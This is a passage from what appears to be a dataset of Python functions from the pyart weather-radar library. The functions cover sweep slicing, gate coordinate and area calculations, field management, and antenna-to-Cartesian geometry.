        filter_transitions : bool, optional
            True to remove rays where the antenna was in transition between
            sweeps. False will include these rays. No rays will be removed
            if the antenna_transition attribute is not available (set to None).

        Returns
        -------
        x, y, z : 2D array
            Array containing the x, y and z, distances from the radar in
            meters for the center (or edges) for all gates in the sweep.

        """"""
    azimuths = self.get_azimuth(sweep)
    elevations = self.get_elevation(sweep)
    if filter_transitions and self.antenna_transition is not None:
        sweep_slice = self.get_slice(sweep)
        valid = self.antenna_transition['data'][sweep_slice] == 0
        azimuths = azimuths[valid]
        elevations = elevations[valid]
    return antenna_vectors_to_cartesian(self.range['data'], azimuths, elevations, edges=edges)"
ARM-DOE/pyart,get_gate_area,"def get_gate_area(self, sweep):
    """"""
        Return the area of each gate in a sweep. Units of area will be the
        same as those of the range variable, squared.

        Assumptions:
            1. Azimuth data is in degrees.

        Parameters
        ----------
        sweep : int
            Sweep number to retrieve gate locations from, 0 based.

        Returns
        -------
        area : 2D array of size (ngates - 1, nrays - 1)
            Array containing the area (in m * m) of each gate in the sweep.

        """"""
    s = self.get_slice(sweep)
    azimuths = self.azimuth['data'][s]
    ranges = self.range['data']
    circular_area = np.pi * ranges ** 2
    annular_area = np.diff(circular_area)
    az_diffs = np.diff(azimuths)
    az_diffs[az_diffs < 0.0] += 360
    d_azimuths = az_diffs / 360.0
    (dca, daz) = np.meshgrid(annular_area, d_azimuths)
    area = np.abs(dca * daz)
    return area"
ARM-DOE/pyart,get_gate_lat_lon_alt,"def get_gate_lat_lon_alt(self, sweep, reset_gate_coords=False, filter_transitions=False):
    """"""
        Return the longitude, latitude and altitude gate locations.
        Longitude and latitude are in degrees and altitude in meters.

        With the default parameter this method returns the same data as
        contained in the gate_latitude, gate_longitude and gate_altitude
        attributes but this method performs the gate location calculations
        only for the specified sweep and therefore is more efficient than
        accessing this data through these attribute. If coordinates have
        at all, please use the reset_gate_coords parameter.

        Parameters
        ----------
        sweep : int
            Sweep number to retrieve gate locations from, 0 based.
        reset_gate_coords : bool, optional
            Optional to reset the gate latitude, gate longitude and gate
            altitude attributes before using them in this function. This
            is useful when the geographic coordinates have changed and gate
            latitude, gate longitude and gate altitude need to be reset.
        filter_transitions : bool, optional
            True to remove rays where the antenna was in transition between
            sweeps. False will include these rays. No rays will be removed
            if the antenna_transition attribute is not available (set to None).

        Returns
        -------
        lat, lon, alt : 2D array
            Array containing the latitude, longitude and altitude,
            for all gates in the sweep.

        """"""
    s = self.get_slice(sweep)
    if reset_gate_coords:
        gate_latitude = LazyLoadDict(get_metadata('gate_latitude'))
        gate_latitude.set_lazy('data', _gate_lon_lat_data_factory(self, 1))
        self.gate_latitude = gate_latitude
        gate_longitude = LazyLoadDict(get_metadata('gate_longitude'))
        gate_longitude.set_lazy('data', _gate_lon_lat_data_factory(self, 0))
        self.gate_longitude = gate_longitude
        gate_altitude = LazyLoadDict(get_metadata('gate_altitude'))
        gate_altitude.set_lazy('data', _gate_altitude_data_factory(self))
        self.gate_altitude = gate_altitude
    lat = self.gate_latitude['data'][s]
    lon = self.gate_longitude['data'][s]
    alt = self.gate_altitude['data'][s]
    if filter_transitions and self.antenna_transition is not None:
        valid = self.antenna_transition['data'][s] == 0
        lat = lat[valid]
        lon = lon[valid]
        alt = alt[valid]
    return (lat, lon, alt)"
ARM-DOE/pyart,get_nyquist_vel,"def get_nyquist_vel(self, sweep, check_uniform=True):
    """"""
        Return the Nyquist velocity in meters per second for a given sweep.

        Raises a LookupError if the Nyquist velocity is not available, an
        Exception is raised if the velocities are not uniform in the sweep
        unless check_uniform is set to False.

        Parameters
        ----------
        sweep : int
            Sweep number to retrieve data for, 0 based.
        check_uniform : bool
            True to check to perform a check on the Nyquist velocities that
            they are uniform in the sweep, False will skip this check and
            return the velocity of the first ray in the sweep.

        Returns
        -------
        nyquist_velocity : float
            Array containing the Nyquist velocity in m/s for a given sweep.

        """"""
    s = self.get_slice(sweep)
    try:
        nyq_vel = self.instrument_parameters['nyquist_velocity']['data'][s]
    except TypeError:
        raise LookupError('Nyquist velocity unavailable')
    if check_uniform:
        if np.any(nyq_vel != nyq_vel[0]):
            raise Exception('Nyquist velocities are not uniform in sweep')
    return float(nyq_vel[0])"
ARM-DOE/pyart,info,"def info(self, level='standard', out=sys.stdout):
    """"""
        Print information on radar.

        Parameters
        ----------
        level : {'compact', 'standard', 'full', 'c', 's', 'f'}, optional
            Level of information on radar object to print, compact is
            minimal information, standard more and full everything.
        out : file-like, optional
            Stream to direct output to, default is to print information
            to standard out (the screen).

        """"""
    if level == 'c':
        level = 'compact'
    elif level == 's':
        level = 'standard'
    elif level == 'f':
        level = 'full'
    if level not in ['standard', 'compact', 'full']:
        raise ValueError('invalid level parameter')
    self._dic_info('altitude', level, out)
    self._dic_info('altitude_agl', level, out)
    self._dic_info('antenna_transition', level, out)
    self._dic_info('azimuth', level, out)
    self._dic_info('elevation', level, out)
    print('fields:', file=out)
    for (field_name, field_dic) in self.fields.items():
        self._dic_info(field_name, level, out, field_dic, 1)
    self._dic_info('fixed_angle', level, out)
    if self.instrument_parameters is None:
        print('instrument_parameters: None', file=out)
    else:
        print('instrument_parameters:', file=out)
        for (name, dic) in self.instrument_parameters.items():
            self._dic_info(name, level, out, dic, 1)
    self._dic_info('latitude', level, out)
    self._dic_info('longitude', level, out)
    print('nsweeps:', self.nsweeps, file=out)
    print('ngates:', self.ngates, file=out)
    print('nrays:', self.nrays, file=out)
    if self.radar_calibration is None:
        print('radar_calibration: None', file=out)
    else:
        print('radar_calibration:', file=out)
        for (name, dic) in self.radar_calibration.items():
            self._dic_info(name, level, out, dic, 1)
    self._dic_info('range', level, out)
    self._dic_info('scan_rate', level, out)
    print('scan_type:', self.scan_type, file=out)
    self._dic_info('sweep_end_ray_index', level, out)
    self._dic_info('sweep_mode', level, out)
    self._dic_info('sweep_number', level, out)
    self._dic_info('sweep_start_ray_index', level, out)
    self._dic_info('target_scan_rate', level, out)
    self._dic_info('time', level, out)
    if self.rotation is not None:
        self._dic_info('rotation', level, out)
    if self.tilt is not None:
        self._dic_info('tilt', level, out)
    if self.roll is not None:
        self._dic_info('roll', level, out)
    if self.drift is not None:
        self._dic_info('drift', level, out)
    if self.heading is not None:
        self._dic_info('heading', level, out)
    if self.pitch is not None:
        self._dic_info('pitch', level, out)
    if self.georefs_applied is not None:
        self._dic_info('georefs_applied', level, out)
    self._dic_info('metadata', 'full', out)"
ARM-DOE/pyart,_dic_info,"def _dic_info(self, attr, level, out, dic=None, ident_level=0):
    """"""Print information on a dictionary attribute.""""""
    if dic is None:
        dic = getattr(self, attr)
    ilvl0 = '\t' * ident_level
    ilvl1 = '\t' * (ident_level + 1)
    if dic is None:
        print(str(attr) + ': None', file=out)
        return
    if 'data' not in dic:
        d_str = 'Missing'
    elif not isinstance(dic['data'], np.ndarray):
        d_str = '<not a ndarray>'
    else:
        data = dic['data']
        t = (data.dtype, data.shape)
        d_str = '<ndarray of type: {} and shape: {}>'.format(*t)
    if level == 'compact':
        print(ilvl0 + str(attr) + ':', d_str, file=out)
    elif level == 'standard':
        print(ilvl0 + str(attr) + ':', file=out)
        print(ilvl1 + 'data:', d_str, file=out)
        for (key, val) in dic.items():
            if key == 'data':
                continue
            print(ilvl1 + key + ':', val, file=out)
    elif level == 'full':
        print(str(attr) + ':', file=out)
        if 'data' in dic:
            print(ilvl1 + 'data:', dic['data'], file=out)
        for (key, val) in dic.items():
            if key == 'data':
                continue
            print(ilvl1 + key + ':', val, file=out)
    return"
ARM-DOE/pyart,add_field,"def add_field(self, field_name, dic, replace_existing=False):
    """"""
        Add a field to the object.

        Parameters
        ----------
        field_name : str
            Name of the field to add to the dictionary of fields.
        dic : dict
            Dictionary contain field data and metadata.
        replace_existing : bool, optional
            True to replace the existing field with key field_name if it
            exists, loosing any existing data. False will raise a ValueError
            when the field already exists.

        """"""
    if field_name in self.fields and replace_existing is False:
        err = 'A field with name: %s already exists' % field_name
        raise ValueError(err)
    if 'data' not in dic:
        raise KeyError(""dic must contain a 'data' key"")
    if dic['data'].shape != (self.nrays, self.ngates):
        t = (self.nrays, self.ngates)
        err = ""'data' has invalid shape, should be (%i, %i)"" % t
        raise ValueError(err)
    self.fields[field_name] = dic
    return"
ARM-DOE/pyart,add_filter,"def add_filter(self, gatefilter, replace_existing=False, include_fields=None):
    """"""
        Updates the radar object with an applied gatefilter provided
        by the user that masks values in fields within the radar object.

        Parameters
        ----------
        gatefilter : GateFilter
            GateFilter instance. This filter will exclude equal to
            the conditions provided in the gatefilter and mask values
            in fields specified or all fields if include_fields is None.
        replace_existing : bool, optional
            If True, replaces the fields in the radar object with
            copies of those fields with the applied gatefilter.
            False will return new fields with the appended 'filtered_'
            prefix.
        include_fields : list, optional
            List of fields to have filtered applied to. If none, all
            fields will have applied filter.

        """"""
    if include_fields is None:
        include_fields = [*self.fields.keys()]
    try:
        if replace_existing:
            for field in include_fields:
                self.fields[field]['data'] = np.ma.masked_where(gatefilter.gate_excluded, self.fields[field]['data'])
        else:
            for field in include_fields:
                field_dict = copy.deepcopy(self.fields[field])
                field_dict['data'] = np.ma.masked_where(gatefilter.gate_excluded, field_dict['data'])
                self.add_field('filtered_' + field, field_dict, replace_existing=True)
    except KeyError:
        raise KeyError(field + ' not found in the original radar object, please check that names in the include_fields list match those in the radar object.')
    return"
ARM-DOE/pyart,add_field_like,"def add_field_like(self, existing_field_name, field_name, data, replace_existing=False):
    """"""
        Add a field to the object with metadata from a existing field.

        Note that the data parameter is not copied by this method.
        If data refers to a 'data' array from an existing field dictionary, a
        copy should be made within or prior to using this method. If this is
        not done the 'data' key in both field dictionaries will point to the
        same NumPy array and modification of one will change the second. To
        copy NumPy arrays use the copy() method. See the Examples section
        for how to create a copy of the 'reflectivity' field as a field named
        'reflectivity_copy'.

        Parameters
        ----------
        existing_field_name : str
            Name of an existing field to take metadata from when adding
            the new field to the object.
        field_name : str
            Name of the field to add to the dictionary of fields.
        data : array
            Field data. A copy of this data is not made, see the note above.
        replace_existing : bool, optional
            True to replace the existing field with key field_name if it
            exists, loosing any existing data. False will raise a ValueError
            when the field already exists.

        Examples
        --------
        >>> radar.add_field_like('reflectivity', 'reflectivity_copy',
        ...                      radar.fields['reflectivity']['data'].copy())

        """"""
    if existing_field_name not in self.fields:
        err = 'field %s does not exist in object' % existing_field_name
        raise ValueError(err)
    dic = {}
    for (k, v) in self.fields[existing_field_name].items():
        if k != 'data':
            dic[k] = v
    dic['data'] = data
    return self.add_field(field_name, dic, replace_existing=replace_existing)"
ARM-DOE/pyart,extract_sweeps,"def extract_sweeps(self, sweeps):
    """"""
        Create a new radar contains only the data from select sweeps.

        Parameters
        ----------
        sweeps : array_like
            Sweeps (0-based) to include in new Radar object.

        Returns
        -------
        radar : Radar
            Radar object which contains a copy of data from the selected
            sweeps.

        """"""
    sweeps = np.array(sweeps, dtype='int32')
    if np.any(sweeps > self.nsweeps - 1):
        raise ValueError('invalid sweeps indices in sweeps parameter')
    if np.any(sweeps < 0):
        raise ValueError('only positive sweeps can be extracted')

    def mkdic(dic, select):
        """"""Make a dictionary, selecting out select from data key""""""
        if dic is None:
            return None
        d = dic.copy()
        if 'data' in d and select is not None:
            d['data'] = d['data'][select].copy()
        return d
    ray_count = (self.sweep_end_ray_index['data'] - self.sweep_start_ray_index['data'] + 1)[sweeps]
    ssri = self.sweep_start_ray_index['data'][sweeps]
    rays = np.concatenate([range(s, s + e) for (s, e) in zip(ssri, ray_count)]).astype('int32')
    if len(self.altitude['data']) == 1:
        loc_select = None
    else:
        loc_select = sweeps
    time = mkdic(self.time, rays)
    _range = mkdic(self.range, None)
    fields = {}
    for (field_name, dic) in self.fields.items():
        fields[field_name] = mkdic(dic, rays)
    metadata = mkdic(self.metadata, None)
    scan_type = str(self.scan_type)
    latitude = mkdic(self.latitude, loc_select)
    longitude = mkdic(self.longitude, loc_select)
    altitude = mkdic(self.altitude, loc_select)
    altitude_agl = mkdic(self.altitude_agl, loc_select)
    sweep_number = mkdic(self.sweep_number, sweeps)
    sweep_mode = mkdic(self.sweep_mode, sweeps)
    fixed_angle = mkdic(self.fixed_angle, sweeps)
    sweep_start_ray_index = mkdic(self.sweep_start_ray_index, None)
    sweep_start_ray_index['data'] = np.cumsum(np.append([0], ray_count[:-1]), dtype='int32')
    sweep_end_ray_index = mkdic(self.sweep_end_ray_index, None)
    sweep_end_ray_index['data'] = np.cumsum(ray_count, dtype='int32') - 1
    target_scan_rate = mkdic(self.target_scan_rate, sweeps)
    azimuth = mkdic(self.azimuth, rays)
    elevation = mkdic(self.elevation, rays)
    scan_rate = mkdic(self.scan_rate, rays)
    antenna_transition = mkdic(self.antenna_transition, rays)
    if self.instrument_parameters is None:
        instrument_parameters = None
    else:
        instrument_parameters = {}
        for (key, dic) in self.instrument_parameters.items():
            if dic['data'].ndim != 0:
                dim0_size = dic['data'].shape[0]
            else:
                dim0_size = -1
            if dim0_size == self.nsweeps:
                fdic = mkdic(dic, sweeps)
            elif dim0_size == self.nrays:
                fdic = mkdic(dic, rays)
            else:
                fdic = mkdic(dic, None)
            instrument_parameters[key] = fdic
    if self.radar_calibration is None:
        radar_calibration = None
    else:
        radar_calibration = {}
        for (key, dic) in self.radar_calibration.items():
            if key == 'r_calib_index':
                radar_calibration[key] = mkdic(dic, rays)
            else:
                radar_calibration[key] = mkdic(dic, None)
    return Radar(time, _range, fields, metadata, scan_type, latitude, longitude, altitude, sweep_number, sweep_mode, fixed_angle, sweep_start_ray_index, sweep_end_ray_index, azimuth, elevation, altitude_agl=altitude_agl, target_scan_rate=target_scan_rate, scan_rate=scan_rate, antenna_transition=antenna_transition, instrument_parameters=instrument_parameters, radar_calibration=radar_calibration)"
ARM-DOE/pyart,_rays_per_sweep_data,"def _rays_per_sweep_data():
    """"""The function which returns the number of rays per sweep.""""""
    return radar.sweep_end_ray_index['data'] - radar.sweep_start_ray_index['data'] + 1"
ARM-DOE/pyart,_gate_data,"def _gate_data():
    """"""The function which returns the Cartesian locations of gates.""""""
    ranges = radar.range['data']
    azimuths = radar.azimuth['data']
    elevations = radar.elevation['data']
    cartesian_coords = antenna_vectors_to_cartesian(ranges, azimuths, elevations, edges=False)
    if coordinate != 0:
        radar.gate_x['data'] = cartesian_coords[0]
    if coordinate != 1:
        radar.gate_y['data'] = cartesian_coords[1]
    if coordinate != 2:
        radar.gate_z['data'] = cartesian_coords[2]
    return cartesian_coords[coordinate]"
ARM-DOE/pyart,_gate_lon_lat_data,"def _gate_lon_lat_data():
    """"""The function which returns the geographic locations gates.""""""
    x = radar.gate_x['data']
    y = radar.gate_y['data']
    projparams = radar.projection.copy()
    if projparams.pop('_include_lon_0_lat_0', False):
        projparams['lon_0'] = radar.longitude['data'][0]
        projparams['lat_0'] = radar.latitude['data'][0]
    geographic_coords = cartesian_to_geographic(x, y, projparams)
    if coordinate == 0:
        radar.gate_latitude['data'] = geographic_coords[1]
    else:
        radar.gate_longitude['data'] = geographic_coords[0]
    return geographic_coords[coordinate]"
ARM-DOE/pyart,_gate_altitude_data,"def _gate_altitude_data():
    """"""The function which returns the gate altitudes.""""""
    try:
        return radar.altitude['data'] + radar.gate_z['data']
    except ValueError:
        return np.mean(radar.altitude['data']) + radar.gate_z['data']"
ARM-DOE/pyart,mkdic,"def mkdic(dic, select):
    """"""Make a dictionary, selecting out select from data key""""""
    if dic is None:
        return None
    d = dic.copy()
    if 'data' in d and select is not None:
        d['data'] = d['data'][select].copy()
    return d"
ARM-DOE/pyart,_rays_per_sweep_data_factory,"def _rays_per_sweep_data_factory(radar):
    """"""Return a function which returns the number of rays per sweep.""""""
    rays_per_sweep_dict = get_metadata('rays_per_sweep')
    rays_per_sweep = radar.sweep_end_ray_index.values - radar.sweep_start_ray_index.values + 1
    radar['rays_per_sweep'] = xr.DataArray(np.array(rays_per_sweep), attrs=rays_per_sweep_dict)"
ARM-DOE/pyart,_gate_data_factory,"def _gate_data_factory(radar):
    """"""Return a function which returns the Cartesian locations of gates.""""""
    ranges = radar.range.values
    azimuths = radar.azimuth.values
    elevations = radar.elevation.values
    cartesian_coords = antenna_vectors_to_cartesian(ranges, azimuths, elevations, edges=False)
    gate_x_dict = get_metadata('gate_x')
    radar['gate_x'] = xr.DataArray(cartesian_coords[0], dims=('time', 'range'), attrs=gate_x_dict)
    gate_y_dict = get_metadata('gate_y')
    radar['gate_y'] = xr.DataArray(cartesian_coords[1], dims=('time', 'range'), attrs=gate_y_dict)
    gate_z_dict = get_metadata('gate_z')
    radar['gate_z'] = xr.DataArray(cartesian_coords[2], dims=('time', 'range'), attrs=gate_z_dict)"
ARM-DOE/pyart,_gate_lon_lat_data_factory,"def _gate_lon_lat_data_factory(radar):
    """"""Return a function which returns the geographic locations of gates.""""""
    x = radar.gate_x.values
    y = radar.gate_y.values
    projparams = radar.projection.copy()
    if projparams.pop('_include_lon_0_lat_0', False):
        projparams['lon_0'] = radar.longitude.values
        projparams['lat_0'] = radar.latitude.values
    geographic_coords = cartesian_to_geographic(x, y, projparams)
    gate_latitude_dict = get_metadata('gate_latitude')
    radar['gate_latitude'] = xr.DataArray(geographic_coords[1], dims=('time', 'range'), attrs=gate_latitude_dict)
    gate_longitude_dict = get_metadata('gate_longitude')
    radar['gate_longitude'] = xr.DataArray(geographic_coords[0], dims=('time', 'range'), attrs=gate_longitude_dict)"
ARM-DOE/pyart,_gate_altitude_data_factory,"def _gate_altitude_data_factory(radar):
    """"""Return a function which returns the gate altitudes.""""""
    try:
        alt = radar.altitude.values + radar.gate_z.values
    except ValueError:
        alt = np.mean(radar.altitude.values) + radar.gate_z.values
    gate_altitude_dict = get_metadata('gate_altitude')
    radar['gate_altitude'] = xr.DataArray(alt, dims=('time', 'range'), attrs=gate_altitude_dict)"
ARM-DOE/pyart,__init__,"def __init__(self, time, _range, fields, metadata, scan_type, latitude, longitude, altitude, sweep_number, sweep_mode, fixed_angle, sweep_start_ray_index, sweep_end_ray_index, azimuth, elevation, npulses_max, velocity_bins, altitude_agl=None, target_scan_rate=None, rays_are_indexed=None, ray_angle_res=None, scan_rate=None, antenna_transition=None, instrument_parameters=None, radar_calibration=None, georefs_applied=None):
    warnings.warn('Radar Spectra object is in early development, errors may arise, use at your own risk! ')
    if not _XARRAY_AVAILABLE:
        raise MissingOptionalDependency('Xarray is required to use RadarSpectra but is not installed!')
    self.field_names = ['spectra']
    self.ds = xr.Dataset(data_vars={'spectra': (('time', 'range', 'npulses_max'), fields), 'velocity_bins': velocity_bins, 'scan_type': scan_type, 'latitude': latitude, 'longitude': longitude, 'altitude': altitude, 'sweep_number': sweep_number, 'sweep_mode': sweep_mode, 'fixed_angle': fixed_angle, 'sweep_start_ray_index': sweep_start_ray_index, 'sweep_end_ray_index': sweep_end_ray_index, 'azimuth': azimuth, 'elevation': elevation}, coords={'time': time, 'range': _range, 'npulses_max': npulses_max}, attrs=metadata)
    self.ds['ngates'] = len(_range.values)
    self.ds['nrays'] = len(time.values)
    self.ds['nsweeps'] = len(sweep_number.values)
    self.ds.attrs['projection'] = {'proj': 'pyart_aeqd', '_include_lon_0_lat_0': True}
    self.init_rays_per_sweep()
    self.init_gate_x_y_z()
    self.init_gate_longitude_latitude()
    self.init_gate_altitude()"
ARM-DOE/pyart,fields,"@property
def fields(self):
    field_dict = {}
    for key in self.field_names:
        if key in self.ds.variables.keys():
            field_dict[key] = self.ds[key]
    return xr.Dataset(field_dict)"
ARM-DOE/pyart,time,"@property
def time(self):
    return self.ds.time"
ARM-DOE/pyart,range,"@property
def range(self):
    return self.ds.range"
ARM-DOE/pyart,npulses_max,"@property
def npulses_max(self):
    return self.ds.npulses_max"
ARM-DOE/pyart,velocity_bins,"@property
def velocity_bins(self):
    return self.ds.velocity_bins"
ARM-DOE/pyart,latitude,"@property
def latitude(self):
    return self.ds.latitude"
ARM-DOE/pyart,longitude,"@property
def longitude(self):
    return self.ds.longitude"
ARM-DOE/pyart,altitude,"@property
def altitude(self):
    return self.ds.altitude"
ARM-DOE/pyart,fixed_angle,"@property
def fixed_angle(self):
    return self.ds.fixed_angle"
ARM-DOE/pyart,sweep_mode,"@property
def sweep_mode(self):
    return self.ds.sweep_mode"
ARM-DOE/pyart,sweep_number,"@property
def sweep_number(self):
    return self.ds.sweep_number"
ARM-DOE/pyart,scan_type,"@property
def scan_type(self):
    return self.ds.scan_type"
ARM-DOE/pyart,elevation,"@property
def elevation(self):
    return self.ds.elevation"
ARM-DOE/pyart,azimuth,"@property
def azimuth(self):
    return self.ds.azimuth"
ARM-DOE/pyart,sweep_start_ray_index,"@property
def sweep_start_ray_index(self):
    return self.ds.sweep_start_ray_index"
ARM-DOE/pyart,sweep_end_ray_index,"@property
def sweep_end_ray_index(self):
    return self.ds.sweep_end_ray_index"
ARM-DOE/pyart,rays_per_sweep,"@property
def rays_per_sweep(self):
    return self.ds.rays_per_sweep"
ARM-DOE/pyart,gate_x,"@property
def gate_x(self):
    return self.ds.gate_x"
ARM-DOE/pyart,gate_y,"@property
def gate_y(self):
    return self.ds.gate_y"
ARM-DOE/pyart,gate_z,"@property
def gate_z(self):
    return self.ds.gate_z"
ARM-DOE/pyart,gate_latitude,"@property
def gate_latitude(self):
    return self.ds.gate_latitude"
ARM-DOE/pyart,gate_longitude,"@property
def gate_longitude(self):
    return self.ds.gate_longitude"
ARM-DOE/pyart,gate_altitude,"@property
def gate_altitude(self):
    return self.ds.gate_altitude"
ARM-DOE/pyart,ngates,"@property
def ngates(self):
    return self.ds.ngates"
ARM-DOE/pyart,nrays,"@property
def nrays(self):
    return self.ds.nrays"
ARM-DOE/pyart,nsweeps,"@property
def nsweeps(self):
    return self.ds.nsweeps"
ARM-DOE/pyart,projection,"@property
def projection(self):
    return self.ds.attrs['projection']"
ARM-DOE/pyart,init_rays_per_sweep,"def init_rays_per_sweep(self):
    """"""Initialize or reset the rays_per_sweep attribute.""""""
    _rays_per_sweep_data_factory(self.ds)"
ARM-DOE/pyart,init_gate_x_y_z,"def init_gate_x_y_z(self):
    """"""Initialize or reset the gate_{x, y, z} attributes.""""""
    _gate_data_factory(self.ds)"
ARM-DOE/pyart,init_gate_longitude_latitude,"def init_gate_longitude_latitude(self):
    """"""
        Initialize or reset the gate_longitude and gate_latitude attributes.
        """"""
    _gate_lon_lat_data_factory(self.ds)"
ARM-DOE/pyart,init_gate_altitude,"def init_gate_altitude(self):
    """"""Initialize the gate_altitude attribute.""""""
    _gate_altitude_data_factory(self.ds)"
ARM-DOE/pyart,_check_sweep_in_range,"def _check_sweep_in_range(self, sweep):
    """"""Check that a sweep number is in range.""""""
    if sweep < 0 or sweep >= self.nsweeps:
        raise IndexError('Sweep out of range: ', sweep)"
ARM-DOE/pyart,get_start,"def get_start(self, sweep):
    """"""Return the starting ray index for a given sweep.""""""
    self._check_sweep_in_range(sweep)
    return self.sweep_start_ray_index.values[sweep]"
ARM-DOE/pyart,get_end,"def get_end(self, sweep):
    """"""Return the ending ray for a given sweep.""""""
    self._check_sweep_in_range(sweep)
    return self.sweep_end_ray_index.values[sweep]"
ARM-DOE/pyart,get_start_end,"def get_start_end(self, sweep):
    """"""Return the starting and ending ray for a given sweep.""""""
    return (self.get_start(sweep), self.get_end(sweep))"
ARM-DOE/pyart,get_slice,"def get_slice(self, sweep):
    """"""Return a slice for selecting rays for a given sweep.""""""
    (start, end) = self.get_start_end(sweep)
    return slice(start, end + 1)"
ARM-DOE/pyart,check_field_exists,"def check_field_exists(self, field_name):
    """"""
        Check that a field exists in the fields dictionary.
        If the field does not exist raise a KeyError.

        Parameters
        ----------
        field_name : str
            Name of field to check.

        """"""
    if field_name not in self.fields.keys():
        raise KeyError('Field not available: ' + field_name)"
ARM-DOE/pyart,iter_start,"def iter_start(self):
    """"""Return an iterator over the sweep start indices.""""""
    return (s for s in self.sweep_start_ray_index.values)"
ARM-DOE/pyart,iter_end,"def iter_end(self):
    """"""Return an iterator over the sweep end indices.""""""
    return (s for s in self.sweep_end_ray_index.values)"
ARM-DOE/pyart,iter_start_end,"def iter_start_end(self):
    """"""Return an iterator over the sweep start and end indices.""""""
    return ((s, e) for (s, e) in zip(self.iter_start(), self.iter_end()))"
ARM-DOE/pyart,iter_slice,"def iter_slice(self):
    """"""Return an iterator which returns sweep slice objects.""""""
    return (slice(s, e + 1) for (s, e) in self.iter_start_end())"
ARM-DOE/pyart,iter_field,"def iter_field(self, field_name):
    """"""Return an iterator which returns sweep field data.""""""
    self.check_field_exists(field_name)
    return (self.fields[field_name].values[s] for s in self.iter_slice())"
ARM-DOE/pyart,iter_azimuth,"def iter_azimuth(self):
    """"""Return an iterator which returns sweep azimuth data.""""""
    return (self.azimuth.values[s] for s in self.iter_slice())"
ARM-DOE/pyart,iter_elevation,"def iter_elevation(self):
    """"""Return an iterator which returns sweep elevation data.""""""
    return (self.elevation.values[s] for s in self.iter_slice())"
ARM-DOE/pyart,to_vpt,"def to_vpt(self):
    """"""Returns a simple Radar object in VPT scan type with spectra moments
        such as reflectivity and mean velocity.""""""
    from ..retrieve import spectra_moments
    from ..testing import make_empty_ppi_radar
    from ..util import to_vpt
    rng_len = len(self.range.values)
    time_len = len(self.time.values)
    vpt_radar = make_empty_ppi_radar(ngates=rng_len, rays_per_sweep=time_len, nsweeps=1)
    fields = spectra_moments(self)
    rng_dict = get_metadata('range')
    rng_dict['data'] = self.range.values
    time_dict = get_metadata('time')
    time_dict['data'] = self.time.values
    vpt_radar.range = rng_dict
    vpt_radar.time = time_dict
    vpt_radar.fields = fields
    vpt_radar.metadata['instrument_name'] = 'KAZR'
    to_vpt(vpt_radar)
    return vpt_radar"
ARM-DOE/pyart,antenna_to_cartesian,"def antenna_to_cartesian(ranges, azimuths, elevations):
    """"""
    Return Cartesian coordinates from antenna coordinates.

    Parameters
    ----------
    ranges : array
        Distances to the center of the radar gates (bins) in kilometers.
    azimuths : array
        Azimuth angle of the radar in degrees.
    elevations : array
        Elevation angle of the radar in degrees.

    Returns
    -------
    x, y, z : array
        Cartesian coordinates in meters from the radar.

    Notes
    -----
    The calculation for Cartesian coordinate is adapted from equations
    2.28(b) and 2.28(c) of Doviak and Zrnic [1]_ assuming a
    standard atmosphere (4/3 Earth's radius model).

    .. math::

        z = \\sqrt{r^2+R^2+2*r*R*sin(\\theta_e)} - R

        s = R * arcsin(\\frac{r*cos(\\theta_e)}{R+z})

        x = s * sin(\\theta_a)

        y = s * cos(\\theta_a)

    Where r is the distance from the radar to the center of the gate,
    :math:`\\theta_a` is the azimuth angle, :math:`\\theta_e` is the
    elevation angle, s is the arc length, and R is the effective radius
    of the earth, taken to be 4/3 the mean radius of earth (6371 km).

    References
    ----------
    .. [1] Doviak and Zrnic, Doppler Radar and Weather Observations, Second
        Edition, 1993, p. 21.

    """"""
    theta_e = np.deg2rad(elevations)
    theta_a = np.deg2rad(azimuths)
    R = 6371.0 * 1000.0 * 4.0 / 3.0
    r = ranges * 1000.0
    z = (r ** 2 + R ** 2 + 2.0 * r * R * np.sin(theta_e)) ** 0.5 - R
    s = R * np.arcsin(r * np.cos(theta_e) / (R + z))
    x = s * np.sin(theta_a)
    y = s * np.cos(theta_a)
    return (x, y, z)"
ARM-DOE/pyart,antenna_vectors_to_cartesian,"def antenna_vectors_to_cartesian(ranges, azimuths, elevations, edges=False):
    """"""
    Calculate Cartesian coordinate for gates from antenna coordinate vectors.

    Calculates the Cartesian coordinates for the gate centers or edges for
    all gates from antenna coordinate vectors assuming a standard atmosphere
    (4/3 Earth's radius model). See :py:func:`pyart.util.antenna_to_cartesian`
    for details.

    Parameters
    ----------
    ranges : array, 1D.
        Distances to the center of the radar gates (bins) in meters.
    azimuths : array, 1D.
        Azimuth angles of the rays in degrees.
    elevations : array, 1D.
        Elevation angles of the rays in degrees.
    edges : bool, optional
        True to calculate the coordinates of the gate edges by interpolating
        between gates and extrapolating at the boundaries. False to
        calculate the gate centers.

    Returns
    -------
    x, y, z : array, 2D
        Cartesian coordinates in meters from the center of the radar to the
        gate centers or edges.

    """"""
    if edges:
        if len(ranges) != 1:
            ranges = _interpolate_range_edges(ranges)
        if len(elevations) != 1:
            elevations = _interpolate_elevation_edges(elevations)
        if len(azimuths) != 1:
            azimuths = _interpolate_azimuth_edges(azimuths)
    (rg, azg) = np.meshgrid(ranges, azimuths)
    (rg, eleg) = np.meshgrid(ranges, elevations)
    return antenna_to_cartesian(rg / 1000.0, azg, eleg)"
ARM-DOE/pyart,_interpolate_range_edges,"def _interpolate_range_edges(ranges):
    """"""Interpolate the edges of the range gates from their centers.""""""
    edges = np.empty((ranges.shape[0] + 1,), dtype=ranges.dtype)
    edges[1:-1] = (ranges[:-1] + ranges[1:]) / 2.0
    edges[0] = ranges[0] - (ranges[1] - ranges[0]) / 2.0
    edges[-1] = ranges[-1] - (ranges[-2] - ranges[-1]) / 2.0
    edges[edges < 0] = 0
    return edges"
ARM-DOE/pyart,_interpolate_elevation_edges,"def _interpolate_elevation_edges(elevations):
    """"""Interpolate the edges of the elevation angles from their centers.""""""
    edges = np.empty((elevations.shape[0] + 1,), dtype=elevations.dtype)
    edges[1:-1] = (elevations[:-1] + elevations[1:]) / 2.0
    edges[0] = elevations[0] - (elevations[1] - elevations[0]) / 2.0
    edges[-1] = elevations[-1] - (elevations[-2] - elevations[-1]) / 2.0
    edges[edges > 180] = 180.0
    edges[edges < 0] = 0.0
    return edges"
ARM-DOE/pyart,_interpolate_azimuth_edges,"def _interpolate_azimuth_edges(azimuths):
    """"""Interpolate the edges of the azimuth angles from their centers.""""""
    edges = np.empty((azimuths.shape[0] + 1,), dtype=azimuths.dtype)
    azimuths = np.exp(1j * np.deg2rad(azimuths))
    edges[1:-1] = np.angle(azimuths[1:] + azimuths[:-1], deg=True)
    half_angle = _half_angle_complex(azimuths[0], azimuths[1])
